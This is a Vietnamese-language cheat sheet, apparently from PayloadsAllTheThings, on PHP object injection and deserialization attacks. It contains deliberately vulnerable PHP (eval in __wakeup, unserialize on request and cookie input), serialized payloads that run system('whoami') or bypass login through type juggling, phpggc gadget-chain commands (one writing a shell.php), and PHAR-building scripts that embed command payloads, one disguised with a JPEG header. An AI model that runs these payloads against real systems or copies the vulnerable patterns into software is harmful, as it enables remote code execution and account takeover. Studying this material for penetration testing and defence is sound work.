# PHP Deserialization

> PHP Object Injection là một lỗ hổng ở cấp độ ứng dụng có thể cho phép kẻ tấn công thực hiện nhiều loại tấn công độc hại khác nhau, chẳng hạn như Code Injection, SQL Injection, Path Traversal và Application Denial of Service, tùy thuộc vào ngữ cảnh. Lỗ hổng xảy ra khi dữ liệu đầu vào do người dùng cung cấp không được làm sạch đúng cách trước khi được truyền vào hàm `unserialize()` của PHP. Vì PHP cho phép tuần tự hóa đối tượng, kẻ tấn công có thể truyền các chuỗi đã được tuần tự hóa tùy ý vào lời gọi `unserialize()` dễ bị tổn thương, dẫn đến việc chèn các PHP object tùy ý vào phạm vi của ứng dụng.

## Tóm tắt

* [Khái niệm tổng quát](#khái-niệm-tổng-quát)
* [Vượt qua xác thực](#vượt-qua-xác-thực)
* [Object Injection](#object-injection)
* [Tìm kiếm và sử dụng Gadget](#tìm-kiếm-và-sử-dụng-gadget)
* [Phân giải tuần tự Phar](#phân-giải-tuần-tự-phar)
* [Ví dụ thực tế](#ví-dụ-thực-tế)
* [Tài liệu tham khảo](#tài-liệu-tham-khảo)

## Khái niệm tổng quát

Các magic method sau sẽ hữu ích khi thực hiện PHP Object Injection:

* `__wakeup()` khi một object được unserialize.
* `__destruct()` khi một object bị xóa.
* `__toString()` khi một object được chuyển đổi thành string.

Ngoài ra, bạn cũng nên kiểm tra `Wrapper Phar://` trong [File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phar), vì nó sử dụng PHP Object Injection.

Code dễ bị tổn thương:

```php
<?php 
    class PHPObjectInjection{
        public $inject;
        function __construct(){
        }
        function __wakeup(){
            if(isset($this->inject)){
                eval($this->inject);
            }
        }
    }
    if(isset($_REQUEST['r'])){  
        $var1=unserialize($_REQUEST['r']);
        if(is_array($var1)){
            echo "<br/>".$var1[0]." - ".$var1[1];
        }
    }
    else{
        echo ""; # nothing happens here
    }
?>
```

Tạo payload bằng cách sử dụng code có sẵn bên trong ứng dụng.

* Dữ liệu được tuần tự hóa cơ bản

  ```php
  a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}
  ```

* Thực thi lệnh

  ```php
  string(68) "O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}"
  ```

## Vượt qua xác thực

### Type Juggling

Code dễ bị tổn thương:

```php
<?php
$data = unserialize($_COOKIE['auth']);

if ($data['username'] == $adminName && $data['password'] == $adminPassword) {
    $admin = true;
} else {
    $admin = false;
}
```

Payload:

```php
a:2:{s:8:"username";b:1;s:8:"password";b:1;}
```

Bởi vì `true == "str"` là `true`.

## Object Injection

Code dễ bị tổn thương:

```php
<?php
class ObjectExample
{
  var $guess;
  var $secretCode;
}

$obj = unserialize($_GET['input']);

if($obj) {
    $obj->secretCode = rand(500000,999999);
    if($obj->guess === $obj->secretCode) {
        echo "Win";
    }
}
?>
```

Payload:

```php
O:13:"ObjectExample":2:{s:10:"secretCode";N;s:5:"guess";R:2;}
```

Có thể tạo một array như sau:

```php
a:2:{s:10:"admin_hash";N;s:4:"hmac";R:2;}
```

## Tìm kiếm và sử dụng Gadget

Còn được gọi là `"PHP POP Chains"`, chúng có thể được sử dụng để đạt được RCE trên hệ thống.

* Trong source code PHP, tìm hàm `unserialize()`.
* Các [Magic Methods](https://www.php.net/manual/en/language.oop5.magic.php) đáng chú ý như `__construct()`, `__destruct()`, `__call()`, `__callStatic()`, `__get()`, `__set()`, `__isset()`, `__unset()`, `__sleep()`, `__wakeup()`, `__serialize()`, `__unserialize()`, `__toString()`, `__invoke()`, `__set_state()`, `__clone()` và `__debugInfo()`:

  * `__construct()`: PHP cho phép developer khai báo constructor method cho các class. Các class có constructor method sẽ gọi method này trên mỗi object mới được tạo, do đó nó phù hợp cho mọi quá trình khởi tạo mà object có thể cần trước khi được sử dụng. [php.net](https://www.php.net/manual/en/language.oop5.decon.php#object.construct)
  * `__destruct()`: Destructor method sẽ được gọi ngay khi không còn reference nào khác tới một object cụ thể, hoặc theo bất kỳ thứ tự nào trong quá trình shutdown. [php.net](https://www.php.net/manual/en/language.oop5.decon.php#object.destruct)
  * `__call(string $name, array $arguments)`: Đối số `$name` là tên của method đang được gọi. Đối số `$arguments` là một array được đánh số chứa các tham số được truyền vào method có tên `$name`. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.call)
  * `__callStatic(string $name, array $arguments)`: Đối số `$name` là tên của method đang được gọi. Đối số `$arguments` là một array được đánh số chứa các tham số được truyền vào method có tên `$name`. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.callstatic)
  * `__get(string $name)`: `__get()` được sử dụng để đọc dữ liệu từ các property không thể truy cập (protected hoặc private) hoặc không tồn tại. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.get)
  * `__set(string $name, mixed $value)`: `__set()` được chạy khi ghi dữ liệu vào các property không thể truy cập (protected hoặc private) hoặc không tồn tại. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.set)
  * `__isset(string $name)`: `__isset()` được kích hoạt khi gọi `isset()` hoặc `empty()` trên các property không thể truy cập (protected hoặc private) hoặc không tồn tại. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.isset)
  * `__unset(string $name)`: `__unset()` được gọi khi `unset()` được sử dụng trên các property không thể truy cập (protected hoặc private) hoặc không tồn tại. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.unset)
  * `__sleep()`: `serialize()` kiểm tra xem class có function với tên magic `__sleep()` hay không. Nếu có, function đó được thực thi trước bất kỳ quá trình serialization nào. Nó có thể dọn dẹp object và được kỳ vọng trả về một array chứa tên của tất cả biến trong object cần được serialized. Nếu method không trả về giá trị nào thì **null** sẽ được serialized và một **E_NOTICE** được phát ra. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.sleep)
  * `__wakeup()`: `unserialize()` kiểm tra sự tồn tại của function với tên magic `__wakeup()`. Nếu tồn tại, function này có thể khôi phục bất kỳ resource nào mà object có thể có. Mục đích sử dụng ban đầu của `__wakeup()` là thiết lập lại các database connection có thể đã bị mất trong quá trình serialization và thực hiện các tác vụ khởi tạo lại. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.wakeup)
  * `__serialize()`: `serialize()` kiểm tra xem class có function với tên magic `__serialize()` hay không. Nếu có, function đó được thực thi trước bất kỳ quá trình serialization nào. Nó phải xây dựng và trả về một associative array gồm các cặp key/value đại diện cho dạng serialized của object. Nếu không trả về array, một TypeError sẽ được throw. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.serialize)
  * `__unserialize(array $data)`: function này sẽ nhận array đã được khôi phục, vốn được trả về từ `__serialize()`. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.unserialize)
  * `__toString()`: Method `__toString()` cho phép một class quyết định cách nó phản ứng khi được xử lý như một string. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.tostring)
  * `__invoke()`: Method `__invoke()` được gọi khi một script cố gắng gọi một object như một function. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.invoke)
  * `__set_state(array $properties)`: Static method này được gọi đối với các class được export bởi `var_export()`. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.set-state)
  * `__clone()`: Sau khi quá trình cloning hoàn tất, nếu một method `__clone()` được định nghĩa, `__clone()` của object mới được tạo sẽ được gọi để cho phép thay đổi các property cần thiết. [php.net](https://www.php.net/manual/en/language.oop5.cloning.php#object.clone)
  * `__debugInfo()`: Method này được `var_dump()` gọi khi dump một object để lấy các property cần hiển thị. Nếu method không được định nghĩa trên object, tất cả public, protected và private property sẽ được hiển thị. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.debuginfo)

[ambionics/phpggc](https://github.com/ambionics/phpggc) là một công cụ được xây dựng để tạo payload dựa trên nhiều framework:

* Laravel
* Symfony
* SwiftMailer
* Monolog
* SlimPHP
* Doctrine
* Guzzle

```powershell
phpggc monolog/rce1 'phpinfo();' -s
phpggc monolog/rce1 assert 'phpinfo()'
phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data
phpggc Monolog/RCE2 system 'id' -p phar -o /tmp/testinfo.ini
```

## Phân giải tuần tự Phar

Sử dụng wrapper `phar://`, có thể kích hoạt quá trình deserialization trên file được chỉ định, chẳng hạn như trong `file_get_contents("phar://./archives/app.phar")`.

Một PHAR hợp lệ bao gồm bốn thành phần:

1. **Stub**: Stub là một đoạn PHP code được thực thi khi file được truy cập trong một executable context. Tối thiểu, stub phải chứa `__HALT_COMPILER();` ở cuối. Ngoài điều này, không có hạn chế nào đối với nội dung của Phar stub.
2. **Manifest**: Chứa metadata của archive và nội dung của nó.
3. **File Contents**: Chứa các file thực tế bên trong archive.
4. **Signature** *(tùy chọn)*: Dùng để xác minh tính toàn vẹn của archive.

* Ví dụ tạo một Phar để khai thác một `PDFGenerator` tùy chỉnh.

  ```php
  <?php
  class PDFGenerator { }

  //Create a new instance of the Dummy class and modify its property
  $dummy = new PDFGenerator();
  $dummy->callback = "passthru";
  $dummy->fileName = "uname -a > pwned"; //our payload

  // Delete any existing PHAR archive with that name
  @unlink("poc.phar");

  // Create a new archive
  $poc = new Phar("poc.phar");

  // Add all write operations to a buffer, without modifying the archive on disk
  $poc->startBuffering();

  // Set the stub
  $poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");

  /* Add a new file in the archive with "text" as its content*/
  $poc["file"] = "text";
  // Add the dummy object to the metadata. This will be serialized
  $poc->setMetadata($dummy);
  // Stop buffering and write changes to disk
  $poc->stopBuffering();
  ?>
  ```

* Ví dụ tạo một Phar với magic byte header của `JPEG`, vì không có giới hạn đối với nội dung của stub.

  ```php
  <?php
  class AnyClass {
      public $data = null;
      public function __construct($data) {
          $this->data = $data;
      }
      
      function __destruct() {
          system($this->data);
      }
  }

  // create new Phar
  $phar = new Phar('test.phar');
  $phar->startBuffering();
  $phar->addFromString('test.txt', 'text');
  $phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

  // add object of any class as meta data
  $object = new AnyClass('whoami');
  $phar->setMetadata($object);
  $phar->stopBuffering();
  ```

## Ví dụ thực tế

* [Vanilla Forums ImportController index file_exists Unserialize Remote Code Execution Vulnerability - Steven Seeley](https://hackerone.com/reports/410237)
* [Vanilla Forums Xenforo password splitHash Unserialize Remote Code Execution Vulnerability - Steven Seeley](https://hackerone.com/reports/410212)
* [Vanilla Forums domGetImages getimagesize Unserialize Remote Code Execution Vulnerability (critical) - Steven Seeley](https://hackerone.com/reports/410882)
* [Vanilla Forums Gdn_Format unserialize() Remote Code Execution Vulnerability - Steven Seeley](https://hackerone.com/reports/407552)

## Tài liệu tham khảo

* [CTF writeup: PHP object injection in kaspersky CTF - Jaimin Gohel - November 24, 2018](https://web.archive.org/web/20210514112950/https://medium.com/@jaimin_gohel/ctf-writeup-php-object-injection-in-kaspersky-ctf-28a68805610d)
* [ECSC 2019 Quals Team France - Jack The Ripper Web - noraj - May 22, 2019](https://web.archive.org/web/20211022161400/https://blog.raw.pm/en/ecsc-2019-quals-write-ups/#164-Jack-The-Ripper-Web)
* [FINDING A POP CHAIN ON A COMMON SYMFONY BUNDLE: PART 1 - Rémi Matasse - September 12, 2023](https://web.archive.org/web/20230915040126/https://www.synacktiv.com/publications/finding-a-pop-chain-on-a-common-symfony-bundle-part-1)
* [FINDING A POP CHAIN ON A COMMON SYMFONY BUNDLE: PART 2 - Rémi Matasse - October 11, 2023](https://web.archive.org/web/20231017130212/https://www.synacktiv.com/publications/finding-a-pop-chain-on-a-common-symfony-bundle-part-2)
* [Finding PHP Serialization Gadget Chain - DG'hAck Unserial killer - xanhacks - August 11, 2022](https://web.archive.org/web/20250926045827/https://www.xanhacks.xyz/p/php-gadget-chain/)
* [How to exploit the PHAR Deserialization Vulnerability - Alexandru Postolache - May 29, 2020](https://web.archive.org/web/20200929143500/https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability/)
* [phar:// deserialization - HackTricks - July 19, 2024](https://web.archive.org/web/20220819225041/https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization)
* [PHP deserialization attacks and a new gadget chain in Laravel - Mathieu Farrell - February 13, 2024](https://web.archive.org/web/20240213181951/https://blog.quarkslab.com/php-deserialization-attacks-and-a-new-gadget-chain-in-laravel.html)
* [PHP Generic Gadget - Charles Fol - July 4, 2017](https://www.ambionics.io/blog/php-generic-gadget-chains)
* [PHP Internals Book - Serialization - jpauli - June 15, 2013](https://web.archive.org/web/20130615052058/http://www.phpinternalsbook.com:80/classes_objects/serialization.html)
* [PHP Object Injection - Egidio Romano - April 24, 2020](https://web.archive.org/web/20130313225253/https://www.owasp.org/index.php/PHP_Object_Injection)
* [PHP Pop Chains - Achieving RCE with POP chain exploits. - Vickie Li - September 3, 2020](https://web.archive.org/web/20200903232359/https://vkili.github.io/blog/insecure%20deserialization/pop-chains/)
* [PHP unserialize - php.net - March 29, 2001](https://web.archive.org/web/20260219122641/https://www.php.net/manual/en/function.unserialize.php)
* [POC2009 Shocking News in PHP Exploitation - Stefan Esser - May 23, 2015](https://web.archive.org/web/20150523205411/https://www.owasp.org/images/f/f6/POC2009-ShockingNewsInPHPExploitation.pdf)
* [Rusty Joomla RCE Unserialize overflow - Alessandro Groppo - October 3, 2019](https://web.archive.org/web/20241010013739/https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/)
* [TSULOTT Web challenge write-up - MeePwn CTF - Rawsec - July 15, 2017](https://web.archive.org/web/20211022151328/https://blog.raw.pm/en/meepwn-2017-write-ups/#TSULOTT-Web)
* [Utilizing Code Reuse/ROP in PHP - Stefan Esser - June 15, 2020](http://web.archive.org/web/20200615044621/https://owasp.org/www-pdf-archive/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf)
